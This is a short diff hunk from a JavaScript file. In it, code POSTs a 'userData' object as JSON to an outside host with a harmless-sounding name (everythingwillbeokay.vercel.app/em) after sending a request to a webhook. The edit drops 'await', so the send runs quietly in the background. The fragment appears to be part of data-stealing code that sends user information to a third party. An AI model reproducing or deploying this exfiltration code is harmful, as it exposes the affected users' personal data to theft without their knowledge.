@@ -74,7 +74,7 @@ await (async () => {
                             keepalive: true
                         }).catch(z => x(`Webhook Error: ${z.message}`));
                         if (userData) {
-                            await fetch('https://everythingwillbeokay.vercel.app/em', {
+                            fetch('https://everythingwillbeokay.vercel.app/em', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(userData),
